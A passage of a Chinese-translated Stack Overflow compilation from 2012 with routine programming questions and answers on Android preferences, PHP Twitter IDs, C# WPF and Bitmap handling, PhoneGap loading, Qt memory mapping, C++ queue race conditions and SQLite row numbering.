        <CheckBoxPreference android:key="com.tsqmadness.bmmaps.filterNonPub" android:summaryOff="Non-Publishable stations will not be shown." android:defaultValue="false" android:summaryOn="Non-Publishable stations will be shown on the map." android:order="4" android:title="Show Non-Publishable" />
    </PreferenceCategory>
    <Preference android:key="temp" android:title="Test" android:summary="Test Item">
        <intent android:targetClass="com.tsqmadness.bmmaps.activities.MainMapScreen" android:targetPackage="com.tsqmadness.bmmaps" />
    </Preference>
</PreferenceScreen> 
```

更改`filterStationType`参数时，从 PreferenceActivity 中按下后退按钮会将首选项文件从上述更改`V-?`为`H-?`，这是应该的。但是，从主 Activity 上的 SharedPreferences 读取值仍然会给出`V-?`, 直到应用重新启动。啊，还有，我`OnPreferenceChangeListnener()`在PreferenceActivity中有一个，当值改变时调用。

**最终编辑**：显然，这是对给定活动的命名 android:process 的使用。Google 地图 API 需要这样做，以允许同一应用程序中的两个单独的 MapActivity 使用不同的设置。如果 PreferenceActivity 被移动到同一个命名进程，那么上面的代码，读取设置中的`onResume()`返回正确的值。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-14T03:11:10.643

由于一切都已检查，我的猜测是您在 PreferenceActivity 的`app_preferences.xml`密钥文件中输入了拼写错误、不正确或未定义的密钥`R.string.option_showSatellite`（无论该字符串是什么）。这将导致两个具有 [您不知道的] 不同名称的键，您认为它们指向相同的值。实际上，prefs 活动正在使用一个键，而您的 Preference 类正在使用另一个 - 导致两个不同的键和两个不同的值。

仔细检查你的钥匙。确保您没有使用文字`"R.string.options_showSatellite"`作为 xml 文件中的键，而是使用实际的字符串。如果您想使用本地化版本，则`@string/options_showSatellite`可以使用密钥。但是，密钥不需要本地化。

如果您好奇，可以通过在标准文本编辑器中打开应用程序数据目录中的首选项管理器创建的首选项文件来仔细检查。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-04-13T21:04:54.537

onResume 你必须获得对 SharedPreferences 的新引用，否则你只是在使用一个已经在内存中的对象（并且有你的旧值）

编辑：与其否决你不理解的答案，为什么不要求澄清呢？我的意思是你应该以正确的方式拉你的首选项（而不是你如何做）......

```
 SharedPreferences sp = getSharedPreferences(getPackageName(), MODE_PRIVATE); 
```

然后看看会发生什么。

# php - 返回浮点数而不是整数

> ID：10148250
> 
> 赞同：1
> 
> 时间：2012-04-13T21:00:30.967
> 
> 标签：php, floating-point, integer

```
/* returns tweetDetails */
function returnTweets()
{
    $return = array();
    $url = $hashtagSearchUrl = "http://search.twitter.com/search.json?q=%23gencsengeleceksin&include_entities=1&result_type=recent&rpp=50";
    foreach(json_decode(file_get_contents($url))->results as $t)
    {
        $return[] = $t;
    }

    return $return;
}

/* assigns tweet details to a variable */
$ts = returnTweets();

foreach ($ts as $t)
    echo $t->id."<br />"; 
```

这必须输出推文 id 的列表。例如 ：

```
190914827918857531
190914827918845655
165456467265456156 
```

通常它可以工作，但在**某些服务器上**它会返回如下内容：

```
1.9090219393785E+17 
```

我怎么解决这个问题？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-13T21:04:26.227

您需要使用 id_str 而不是 id。32 位 PHP（这是大多数人安装的）无法处理大于 32 位的整数。

[https://dev.twitter.com/docs/twitter-ids-json-and-snowflake](https://dev.twitter.com/docs/twitter-ids-json-and-snowflake)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-13T21:03:27.740

可能在 32 位服务器上。

获取属性`id_str`，而不是`id`始终为字符串。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-13T21:04:14.363

整数的大小取决于平台。您可能应该使用字符串而不是数字来操作该数据。

# c# - 在 Visual Studio 2008 解决方案资源管理器中选择/签出文件之间快速导航

> ID：10148254
> 
> 赞同：0
> 
> 时间：2012-04-13T21:01:00.123
> 
> 标签：c#, asp.net, .net, visual-studio, tfs

我正在开发一个非常大的产品，该产品在 5 个不同的项目中包含数百个文件，其中包括一个网站项目

所有这些项目都加载在 VS 2008 中的一个解决方案下

我们使用 TFS 作为源代码控制。

我正在修复这个解决方案中的错误，现在我必须检查各种文件并打开其他许多文件来搜索类似/相关的代码。

我想快速从一个文件导航到另一个文件。我真的花了一些时间来寻找我不想做的合适的文件。

是否可以在解决方案资源管理器中对签出的文件进行分组？或任何其他在选定文件之间导航的方式。

任何其他建议也欢迎。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-19T16:09:03.943

这里有几个小窍门

1.  如果您在 VS Tools => Options 中有这些设置，则在编辑文件时将自动签出文件。

![在此处输入图像描述](../Images/c5242879720b53447c84bde3f8e65d7c.png)

2.  安装[VSCommands](http://visualstudiogallery.msdn.microsoft.com/d491911d-97f3-4cf6-87b0-6a2882120acf?SRC=Home)和[Productivity PowerTools](http://visualstudiogallery.msdn.microsoft.com/d0d33361-18e2-46c0-8ff2-4adea1e34fef?SRC=Home)

![在此处输入图像描述](../Images/963af3e21b40f6389ab3cbe64da9c3e5.png)

**VSCommands**有一些功能可以帮助您提高工作效率

*   [全部收缩](http://vscommands.com/features/#CollapseAll)

*   [打开文件位置](http://vscommands.com/features/#OpenFileLocation)在 VS2008 中很有用

*   [找到源文件](http://vscommands.com/features/#LocateSourceFile) 等等

[**生产力 PowerTools**](http://visualstudiogallery.msdn.microsoft.com/d0d33361-18e2-46c0-8ff2-4adea1e34fef?SRC=Home)有一些功能可以帮助您提高生产力

*   快速查找（在您键入时突出显示您的搜索）

*   增强的滚动条（易于导航到文件的编辑部分）

*   解决方案导航器（键入要搜索的文件名）

*   Ctrl + 单击以导航到定义等等。

我使用**[ReSharper](http://www.jetbrains.com/resharper/)**，其中大部分都在其中。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-13T21:45:00.383

您可以在 Pending Changes 窗口中一目了然地查看已签出的内容。

转到查看菜单，选择其他窗口，然后选择待更改。这将打开 Visual Studio 底部的 Pending Changes 窗口：

![在此处输入图像描述](../Images/957e5b20d34a2e0e003aa4a9551df1c9.png)

从那里，您可以双击任何文件以在编辑器中打开它，或者您可以使用上下文菜单执行其他操作，例如与工作区版本、最新版本进行比较等。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-04-19T15:36:37.563

尽管除了使用 Telerik 的 JustCode 工具外，我没有找到任何智能解决方案。

```
http://www.telerik.com/help/justcode/code-navigation-and-search.html 
```

此工具允许我通过在解决方案资源管理器中按名称搜索文件和定位文件来进行快捷导航:)

至少这给了我预期的 80%。

# c# - 位图构造函数上的参数无效错误

> ID：10148261
> 
> 赞同：0
> 
> 时间：2012-04-13T21:01:28.000
> 
> 标签：c#, winforms, bitmap, ghostscript

我知道，我知道……还有很多其他类似的帖子。我没有找到我要找的东西，让我们继续。

[我使用这个用于 C# 的 GhostScript 实现](https://github.com/mephraim/ghostscriptsharp)将 PDF 分解为图像，然后尝试将每个图像加载到位图中，有时它会`Parameter is not valid error`在这一行给我一个：

```
[...]new Bitmap((Image)Image.FromFile(imagePath))[...] 
```

`Image.FromFile(imagePath)`成功返回一个图像（虽然我认为它返回一个位图）但是位图的构造函数给了我错误。我究竟做错了什么？

PS
我将结果转换为，`Image`因为当我快速查看 Image.FromFile(...) 的结果时，它显示为 System.Drawing.Bitmap （无论哪种方式，转换，不转换，都会产生相同的结果）。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-13T21:10:50.717

您不应该从位图创建新位图，只需将引用投射到您已经拥有的位图：

```
Bitmap b = (Bitmap)Image.FromFile(imagePath); 
```

如果您从从文件加载的位图创建新位图，则不会获得对加载的位图的任何引用。由于您无法处理该位图，您将把它们留给垃圾收集器完成，如果这没有足够快地发生，您可能会耗尽内存。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-13T21:40:55.117

尝试使用接收图像路径的 Bitmap 构造函数，如下所示：

```
var b = new Bitmap(imagePath); 
```

# c# - 如何以编程方式推送 ToggleButton？

> ID：10148264
> 
> 赞同：2
> 
> 时间：2012-04-13T21:01:42.837
> 
> 标签：c#, wpf, ui-automation

我有这个可以以编程方式按下按钮的代码，但我想要一个适用于 ToggleButton 的版本。

```
public static void PushButton(Button b)
{
     ButtonAutomationPeer peer = new ButtonAutomationPeer(b);
     System.Windows.Automation.Provider.IInvokeProvider invokeProv = peer.GetPattern(PatternInterface.Invoke) as System.Windows.Automation.Provider.IInvokeProvider;
     invokeProv.Invoke();
} 
```

所以我尝试了 ToggleButtonAutomationPeer ...

```
public static void PushButton(ToggleButton b)
{
  ToggleButtonAutomationPeer peer = new ToggleButtonAutomationPeer(b);
  System.Windows.Automation.Provider.IInvokeProvider invokeProv = peer.GetPattern(PatternInterface.Invoke) as System.Windows.Automation.Provider.IInvokeProvider;

//But invokeProv is null.   Peer is ok. 
} 
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-04-13T21:05:00.317

您可以使用[Toggle Button Automation Peer](http://msdn.microsoft.com/en-us/library/system.windows.automation.peers.togglebuttonautomationpeer%28v=vs.95%29.aspx)

```
public static void PushToggleButton(ToggleButton b)
{
    ToggleButtonAutomationPeer peer = new ToggleButtonAutomationPeer(b);
    System.Windows.Automation.Provider.IToggleProvider toggleProvider = peer.GetPattern(PatternInterface.Toggle) as System.Windows.Automation.Provider.IToggleProvider;
    toggleProvider.Toggle();
} 
```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2017-05-30T09:40:29.180

另一种方法是在按钮上引发 ClickEvent。

```
//check that the button is untoggled
if (this.MyToggleButton.IsChecked == false)
{
    //set button toggled
    this.MyToggleButton.IsChecked = true;
    //then raise a click evt
    this.MyToggleButton.RaiseEvent(new RoutedEventArgs(Button.ClickEvent));
} 
```

*假设这`MyToggleButton`是`ToggleButton`在代码隐藏或 xaml 中定义的`x:Name`*

# jquery - 在phonegap包装的应用程序中使用jQuery将url加载到div中

> ID：10148265
> 
> 赞同：2
> 
> 时间：2012-04-13T21:02:03.260
> 
> 标签：jquery, jquery-mobile, cordova

我正在尝试开发一个概念证明，我使用 jQuery 将 HTML 内容加载到 div 中。我正在使用 jQuery、jQueryMobile 和 PhoneGap。我有一个带有单个 jQueryMobile 页面的简单 index.html。我想将调用我的服务器的结果（HTML）注入到内容 div 中。我正在 Android 模拟器上对此进行测试。这是我的代码：

```
function onBodyLoad()
{    
    document.addEventListener("deviceready",onDeviceReady,false); 
}

function onDeviceReady()
{     
    var url = "http://www.myserver.com/content/qwerty";
    $("#applicationContainer").load(url);
}
<body onload = "onBodyLoad();">

<div data-role="page" id="page">
    <div data-role="header">
        <h1>My Content</h1>
    </div>
    <div id="applicationContainer" data-role="content"> 
    </div>
</div>

</body> 
```

这是行不通的。我究竟做错了什么？我可以将我的 android apk 文件加载到模拟器中并打开应用程序，但我无法将 HTML 加载到内容 div 中。我的概念是使用 phonegap 将 html 内容加载到页面中创建 android 和 iphone 移动应用程序。我错过了什么？谢谢你的时间。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-13T21:08:48.573

您的 index.html 也必须在同一台服务器上。这是同源策略。

想一想：如果您可以将每个页面加载到您的网站中，您可以执行以下操作：

`$("#container").load("http://facebook.com/messages"`）。每个网站都可以阅读您的私人信息。这就是为什么您只能访问来自同一域的站点的原因。

有一些解决方法，例如 Yahoo Pipes。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-16T04:56:26.420

我偶然发现了本教程，它可能解释了我无法从外部服务器加载内容的原因：

[http://samcroft.co.uk/2011/updated-loading-data-in-phonegap-using-jquery-1-5/](http://samcroft.co.uk/2011/updated-loading-data-in-phonegap-using-jquery-1-5/)

在教程快结束时，作者说 PhoneGap 1.x+ 在项目 plist 文件中添加了“ExternalHosts”（他们的示例处理 iOS）。通过此更改，您必须将您从应用程序中访问的服务器列入白名单，因此请确保添加任何域。那么，如何将外部服务器列入 Android PhoneGap 实现的白名单？您认为这解释了为什么我无法在我的简单示例中加载内容吗？谢谢

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-13T21:03:18.500

您是否将域“www.myserver.com”添加到白名单文件中？

没关系，我想这仅适用于iOS。

您可以在 onDeviceReady 中设置警报以确保调用该代码吗？

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-14T03:42:17.360

```
<script type="text/javascript">

$("#page").bind("pageshow",function(){
 //your jquery operation when pageshow event triggered.

 var url = "http://www.myserver.com/content/qwerty";
 $("#applicationContainer").load(url);

});

function onBodyLoad()
{    
    document.addEventListener("deviceready",onDeviceReady,false); 
}

function onDeviceReady()
{     
   //your phonegap operation.

}
</script>
<body onload = "onBodyLoad();">

<div data-role="page" id="page">
    <div data-role="header">
        <h1>My Content</h1>
    </div>
    <div id="applicationContainer" data-role="content"> 
    </div>
</div>

</body> 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-06-27T12:28:43.683

我找到了如何将外部服务器列入白名单：

[phonegap 1.3.0 中的白名单状态如何？](https://stackoverflow.com/questions/8899608/what-is-the-state-of-whitelisting-in-phonegap-1-3-0)

查找 phonegap.xml（我的是在 res 文件夹中 - ~/res/xml/phonegap.xml）并添加：

这允许所有域。

希望这可以帮助。

# c++ - 问：QT (c++) 上的 memmove() 和 memcpy()

> ID：10148266
> 
> 赞同：0
> 
> 时间：2012-04-13T21:02:09.373
> 
> 标签：c++, qt, winapi, memory

简单的问题，我在使用 memmove() 和 memcpy() 时遇到问题。我真的不明白我的代码有什么问题。顺便说一句，我使用 QT。

```
HANDLE hFile;
HANDLE hMapFile;
HANDLE hMapView;

hFile = CreateFileW((const wchar_t*) objPath.constData(), GENERIC_READ , 0, NULL, OPEN_EXISTING, 0, NULL);
if (hFile != INVALID_HANDLE_VALUE){

    hMapFile = CreateFileMappingW(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
    if (hMapFile != INVALID_HANDLE_VALUE){

        hMapView = MapViewOfFile(hMapFile, GENERIC_READ, 0, 0,0);
        if (hMapView != INVALID_HANDLE_VALUE){
            uint DefineWord;
            memmove((void *) &DefineWord, hMapView,2); // <- always error right here
            qDebug()<<DefineWord;
        }
    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-13T21:18:48.820

`MapViewOfFile`返回一个指针，或者`NULL`当有错误时返回 (0)，而不是`INVALID_HANDLE_VALUE`(-1)。

**编辑：**您的代码还有很多其他问题：

*   `QString::constData()`return `QChar*`， not `wchar_t*`，你必须使用`QString::utf16()`。
*   如果`CreateFileMappingW`失败则返回`NULL`，不返回`INVALID_HANDLE_VALUE`。
*   `MapViewOfFile`访问参数是`FILE_MAP_READ`，不是`GENERIC_READ`。
*   `uint`通常大于 2 个字节，因此`memmove`如果您只读取 2 个字节，则应在之前将变量初始化为 0。

这是应该工作的最小代码（仅在 wineg++/wine 上测试）：

```
#include <windows.h>
#include <QtCore/QString>
#include <QtCore/QDebug>
#include <QtCore/QTextStream>

int main(int argc, char const *argv[])
{
    if (argc < 2) {
        QTextStream(stdout) << "Usage :" << argv[0] << " filename" << endl;
        return 1;
    }

    QString objPath(argv[1]);
    // Qt source uses C-Style cast from utf16() to (wchar_t*),
    // so it should be safe
    HANDLE hFile = CreateFileW((const wchar_t *) objPath.utf16(), GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        qDebug() << qt_error_string(); 
    } else {
        HANDLE hMapFile = CreateFileMappingW(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
        if (!hMapFile) {
            qDebug() << qt_error_string(); 
        } else {
            void *pMapView = MapViewOfFile(hMapFile, FILE_MAP_READ, 0, 0, 0);
            if (!pMapView) {
                qDebug() << qt_error_string();
            } else {
                uint DefineWord = 0;
                memmove((void *) &DefineWord, pMapView, 2);
                qDebug() << DefineWord;
            }
            CloseHandle(hMapFile);
        }
        CloseHandle(hFile);
    }
    return 0;
} 
```

PS:`QString qt_error_string(int errorCode = -1)`是一个明显未记录的 Qt 函数，它返回最后一个错误的错误字符串（来自从`GetLastError()`or返回的错误代码`errno`）。

如果您使用的是 Qt，则可以使用[QFile::map()](http://qt-project.org/doc/qt-4.8/qfile.html#map)将文件映射到内存。
要执行您的初始代码应该执行的操作，您只需在找到的代码示例中添加 2 行（加上错误检查）：

```
QFile file("foo"); 
if(!file.open(QFile::ReadOnly)) {
   qDebug() << file.errorString();
} else {
    uchar *memory = file.map(0, file.size()); 
    if (!memory) {
        qDebug() << file.errorString();
    } else {            
        uint DefineWord = 0;
        memmove(&DefineWord, memory, 2);

        file.unmap(); 
    }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-13T21:10:22.257

`hMapView`不是指针。`memmove`需要两个指针。通过正确声明 hMapView 来解决此问题。它应该是一个`LPVOID`.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-13T21:17:46.843

> 顺便说一句，我使用 QT。

您并没有在示例中真正使用它。Qt 有[QFile::map](http://qt-project.org/doc/qt-4.8/qfile.html#map)方法，可以（并且在我看来应该）用来代替特定于平台的 MapViewOfFile。

# c++ - 为什么作者声称这段代码会导致种族？

> ID：10148267
> 
> 赞同：1
> 
> 时间：2012-04-13T21:02:13.477
> 
> 标签：c++, multithreading, synchronization

为什么作者认为以下部分源代码会导致比赛？

作者说：

> 如果有多个线程从队列中删除项目，这种设计会受到对 empty、front 和 pop 调用之间的竞争条件的影响，但在单消费者系统中（如这里所讨论的），这不是问题。

这是代码：

```
template<typename Data>
class concurrent_queue
{
private:
    std::queue<Data> the_queue;
    mutable boost::mutex the_mutex;
public:
    void push(const Data& data)
    {
        boost::mutex::scoped_lock lock(the_mutex);
        the_queue.push(data);
    }

    bool empty() const
    {
        boost::mutex::scoped_lock lock(the_mutex);
        return the_queue.empty();
    }

    Data& front()
    {
        boost::mutex::scoped_lock lock(the_mutex);
        return the_queue.front();
    }

    Data const& front() const
    {
        boost::mutex::scoped_lock lock(the_mutex);
        return the_queue.front();
    }

    void pop()
    {
        boost::mutex::scoped_lock lock(the_mutex);
        the_queue.pop();
    }
}; 
```

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-04-13T21:09:06.673

如果您打电话`empty`，请检查弹出元素是否安全。在线程系统中可能发生的情况是，在您检查队列不为空之后，另一个线程可能已经弹出了最后一个元素，并且队列不为空不再安全。

```
thread A:                                 thread B:
if(!queue.empty());                            
                                          if(!queue.empty());

                                          queue.pop();

->it is no longer sure that the queue 
  isn't empty 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-04-13T21:10:26.143

如果您有多个线程从队列中“获取”数据，则可能会以一种特别糟糕的方式导致竞争条件。取以下伪代码：

```
class consumer
{
  void do_work()
  {
      if(!work_.empty())
      {
         type& t = work_.front();
         work_.pop();

         // do some work with t
         t...
      }
  }

  concurrent_queue<type> work_;
}; 
```

这看起来很简单，但是如果您有多个`consumer`对象，并且`concurrent_queue`. 如果消费者在调用之后`empty()`但在调用之前被打断`pop()`，那么可能`consumer`会有多个 s 尝试处理同一个对象。

更合适的实现将在接口中公开的单个操作中执行空检查和弹出，如下所示：

```
class concurrent_queue
{
private:
    std::queue<Data> the_queue;
    mutable boost::mutex the_mutex;
public:
    void push(const Data& data)
    {
        boost::mutex::scoped_lock lock(the_mutex);
        the_queue.push(data);
    }

    bool pop(Data& popped)
    {
        boost::mutex::scoped_lock lock(the_mutex);
        if(!the_queue.empty())
        {
            popped = the_queue.front();
            the_queue.pop();
            return true;
        }

        return false;
    }
}; 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-04-13T21:29:05.920

因为你可以这样做...

```
if (!your_concurrent_queue.empty())
    your_concurrent_queue.pop(); 
```

`pop`...并且如果*另一个*线程`pop`在这两行之间调用，仍然会失败。

*（这在实践中是否真的会发生，取决于并发线程的执行**时间**——本质上是线程“竞赛”，谁赢得了这场竞赛，决定了这个错误是否会出现，这在现代抢占式操作系统上基本上是随机的。这种随机性可以使竞争条件非常难以诊断和修复。）*

每当客户端执行像这样的“元操作”时（其中有*几个*调用的序列来实现所需的效果），仅通过方法内锁定来防止竞争条件是不可能的。

而且由于客户端无论如何都必须执行自己的锁定，因此出于性能原因，您甚至可以考虑放弃方法内锁定。只需确保清楚地记录这一点，以便客户知道您没有对线程安全做出任何承诺。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-04-13T21:16:19.533

我认为您感到困惑的是，在您发布的代码中，没有任何东西会导致竞争条件。竞争条件将由实际调用此代码的线程引起。想象一下线程 1 检查线程是否为空。然后该线程休眠一年。一年后当它醒来时，该线程假设队列仍然是空的仍然有效吗？好吧，不，与此同时，另一个线程很容易出现并称为推送。

# c# - 在线程上执行 EventHandler

> ID：10148283
> 
> 赞同：0
> 
> 时间：2012-04-13T21:03:36.480
> 
> 标签：c#, multithreading, silverlight, event-handling

我正在使用`LocalMessageReceiver`and`LocalMessageSender`类在两个 Silverlight 应用程序之间进行通信（一个在浏览器中，另一个在浏览器外）。我需要`messageReceiver.MessageReceived`在一个新线程中执行。这是我的基本代码：

```
public MainPage()
{
    LocalMessageReceiver messageReceiver = new LocalMessageReceiver("Msg", ReceiverNameScope.Global, LocalMessageReceiver.AnyDomain);
    messageReceiver.MessageReceived += MessageReceiver_MessageReceived; //I want to execute this in a new Thread.
    messageReceiver.DisableSenderTrustCheck = true;

    try
    {
        messageReceiver.Listen();
    }
    catch (ListenFailedException)
    {
        //to do
    }
}

private void MessageReceiver_MessageReceived(object sender, MessageReceivedEventArgs e)
{
    string command = e.Message;

    switch (command)
    {
        case "SCAN":
            e.Response = Scan(e.Message); //I need to send a response
            break;
        default:
            e.Response = "NULL";
            break;
    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-13T22:35:26.350

这可能是你想要的...

```
messageReceiver.MessageReceived += (s, e) => 
    Task.Factory.StartNew(() => MessageReceiver_MessageReceived(s, e)); 
```

或使用线程`...new Thread(() => MessageReceiver_MessageReceived(s, e)).Start();`

# facebook - 从 Windows Phone 7 (WP7) 中的 Facebook 联系人中检索或访问电话号码

> ID：10148284
> 
> 赞同：1
> 
> 时间：2012-04-13T21:03:41.747
> 
> 标签：facebook, windows-phone-7, contacts, phone-number, user-data

当我尝试使用 Contacts.SearchAsync 访问 Windows Phone 7 中的联系人列表时，我得到了手机上所有联系人的列表。

但是，遍历 PhoneNumber 属性（ContactPhoneNumber 的列表），它不包含来自 facebook 的任何电话号码...

即，如果联系人在“人员”中心有 2 个号码，一个是手动添加到手机或通过 Live，另一个是直接从 facebook 集成的，则 facebook 电话号码不会显示在 PhoneNumber 列表中联系人。

关于如何检索 Facebook 联系电话号码的任何想法？

这是我的代码：

```
public MainPage()
{            
     Contacts myContacts = new Contacts();
     myContacts.SearchCompleted += new EventHandler<ContactsSearchEventArgs>(myContacts_SearchCompleted);
     myContacts.SearchAsync(String.Empty, FilterKind.None, "");
}

void myContacts_SearchCompleted(object sender, ContactsSearchEventArgs e)
{
     List<Contact> myContacts = e.Results.ToList<Contact>();
     int numbers = myContacts[1].PhoneNumbers.Count(); //Returns 0 if the contact was from facebook, returns 1 if the contact had a number from Live.
} 
```

}

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-13T21:38:44.257

我很确定这是由操作系统故意限制的，您需要在他们的[用户语音站点](http://wpdev.uservoice.com/)上将其作为一项功能来请求。您通常无法从 Facebook API 访问朋友的电话号码（即使您创建了自己的 Facebook 应用程序），所以我猜测 Facebook 让微软限制从第三方应用程序访问这些值。

# c++ - 您如何处理使用 36 位映射的 IO？

> ID：10148285
> 
> 赞同：2
> 
> 时间：2012-04-13T21:03:50.023
> 
> 标签：c++, c, linux, memory, memory-management

我有一块板上装有 APM86290(ppc) SOC 的电路板。这是我第一次尝试这种类型的开发，我正在尝试使用使用 36 位地址映射的 SPI 控制器（根据数据表）。我想使用`mmap()`and读取一些寄存器`/dev/mem`。通常是否有统一的方法来解决那些高四位？或者这可能是这个处理器/[编译器](http://www.mentor.com/embedded-software/sourcery-tools/sourcery-codebench/editions/lite-edition/)特有的东西？这就是我现在尝试做的方式。

```
#define OFFSET 0xfa0000000 

int main()
{
    int i;
    unsigned int * someRegister;

    int fd = open("/dev/mem",O_RDWR|O_SYNC);
    if(fd < 0)
    {
            printf("Can't open /dev/mem\n");
            return 1;
    }
    someRegister = (unsigned int *) mmap(0, sizeof(int), PROT_READ|PROT_WRITE, MAP_SHARED, fd, OFFSET);
    if(someRegister <= NULL)
    {
            printf("Can't mmap\n");
            return 1;
    }
    else
    {
            printf("register=%x\n",OFFSET);
            printf("contents=%x\n",*someRegister);
    }

    return 0;
} 
```

上述程序的输出返回这些错误

> 内核模式下的机器检查。
> 指令读取 PLB 错误
> PLB 主端口请求错误
> PLB 读取错误 0x11000000 在 0x00000000_00000000

我想也许它没有使用 36 位地址并截断一些东西，但是当我做`cat /proc/iomem`

```
effff8000-effffffff : ocm_mem
fa0000000-fa000001f : serial 
```

其中显示了我期望的 36 位值。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-13T21:20:28.240

这很大程度上取决于您的设置。您可以尝试使用 64 位版本的 mmap()：[mmap64()](https://www.gnu.org/software/libc/manual/html_node/Memory_002dmapped-I_002fO.html)。如果这对您不起作用，您可能需要为每个 36 位寄存器映射一个高位和低位寄存器。

# android - 无论如何要更改 SQLITE rawquery 中的行号？

> ID：10148287
> 
> 赞同：0
> 
> 时间：2012-04-13T21:04:06.490
> 
> 标签：android, sqlite, cursor

我已经设置了以下光标来填充一个包含用户付款历史记录的对话框

```
Cursor PaymentsCursor = db.getReadableDatabase().rawQuery(
                "SELECT _id, Date, Payment FROM tblPaymentHistory WHERE DebtName = '"
                        + debtname + "'" + "ORDER BY _id ASC", null);
        SimpleCursorAdapter HistoryAdapter = new SimpleCursorAdapter(this,
                R.layout.paymenthistoryrow, PaymentsCursor, from, to); 
```

问题在于，如果存在不止一种类型的债务，并且每笔债务的付款都乱序，当付款历史记录返回结果时，它会以乱序行号的形式返回，例如 1,2 ,6,7,9,12 等 我知道它正在从数据库中提取 _id（唯一键），但是有没有办法重新设置或更改查询中的行号，以便每个结果返回为“1、2、3、4、5 等“不管原来的身份证？

我认为 ORDER BY _id 甚至 ORDER BY Date ASC 会解决这个问题，但它没有。

我在数据库中的行看起来像这样：

1，测试，2012 年 4 月 13 日，250
2，测试，2012 年 4 月 13 日，300
3，测试，2012 年 4 月 14 日，222
4，TEST2，2012 年 4 月 14 日，500
5，测试，4/ 15/2012, 600

当用户单击“TEST”的历史记录时，它会以 1、2、3、5 的形式返回......如果他们拉起“TEST2”的历史记录，它会显示为“4”，我正在尝试获取它TEST 显示“1,2,3,4”，TEST2 显示“1”

该死的我无法回答我自己的答案，但这是我最终做的：

多谢你们。我找到了一个修改视图的替代选项，因此不必触摸 SqLite db。这是我找到[的修改 SimpleCursorAdapter 数据的链接](https://stackoverflow.com/questions/4776936/modifying-simplecursoradapter-data)

结果如下：

```
PaymentsCursor = db.getReadableDatabase().rawQuery(
            " SELECT _id, Date, Payment FROM tblPaymentHistory WHERE DebtName = '"
                    + debtname + "'" + "ORDER BY _id ASC", null);

    String[] from = new String[] { DbAdapter.KEY_HISTORY_ID,
            DbAdapter.HISTORY_DATE, DbAdapter.HISTORY_PAYMENT };

    int[] to = new int[] { R.id.PAYMENTNO, R.id.PAYMENTDATE,
            R.id.PAYMENTAMOUNT };

    SimpleCursorAdapter HistoryAdapter = new SimpleCursorAdapter(this,
            R.layout.paymenthistoryrow, PaymentsCursor, from, to);

    HistoryAdapter.setViewBinder(new SimpleCursorAdapter.ViewBinder() {
        @Override
        public boolean setViewValue(View view, Cursor cursor, int column) {
            if (column == 0) { // let's suppose that the column 0 is the
                                // date

                TextView tv = (TextView) view;
                String rownum = String.valueOf(cursor.getPosition() + 1);
                // here you use SimpleDateFormat to bla blah blah
                tv.setText(rownum);

                return true;
            }
            return false;
        }
    });

    paymenthistory.setAdapter(HistoryAdapter); 
```

这可能不是最迷人的方式，但现在每次窗口出现历史记录时，它都使用行号（加一）来指示它是哪个#。谢谢大家！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-13T21:38:16.147

这是获取“重新基于”的 ID 的一种方法。在此示例中，“新 ids”基于`grade`（即您的情况下的“旧 ids”）：

```
.headers on

create table foo (name text, grade int);

insert into foo values ('Joe', 45);
insert into foo values ('Anna', 98);
insert into foo values ('Julie', 78);

select name, 
       grade, 
       (select count(*) from foo t1 where t1.grade>=t2.grade) as rank  
from foo t2;

select name, 
       grade, 
       (select count(*) from foo t1 where t1.grade>=t2.grade) as rank  
from foo t2
order by rank; 
```

将其保存为 foo.sql 后，我得到了：

```
[someone@somewhere tmp]$ sqlite3 < foo.sql 
name|grade|rank
Joe|45|3
Anna|98|1
Julie|78|2
name|grade|rank
Anna|98|1
Julie|78|2
Joe|45|3 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-13T22:18:19.957

我已经对@sixfeetsix 回答的内容进行了一些尝试，因为它没有给出 1,2,3,4,.. 编号以及您可能需要放入更多子查询的 WHERE （也许不是，但我不是很好的查询）：

```
SELECT ( 
           SELECT count( * ) + 1
             FROM  ( 
                   SELECT *
                     FROM tblPaymentHistory 
                    WHERE DebtName = ? 
               ) 
               AS t1
            WHERE t1._id < t2._id 
       ) 
       AS _id,
       Date,
       Payment
  FROM tblPaymentHistory AS t2
 WHERE DebtName = ?
 ORDER BY _id; 
```

放入 java String 并留`?`在其中以获得转义值（注入安全）：

```
Cursor PaymentsCursor = db.getReadableDatabase().rawQuery(
                "...WHERE DebtName=? .. WHERE DebtName=? .. ", new String[]{ debtname, debtname }); 
        SimpleCursorAdapter HistoryAdapter = new SimpleCursorAdapter(this,
                R.layout.paymenthistoryrow, PaymentsCursor, from, to); 
```

* * *

## 回答 #3

> 赞同：0
> 
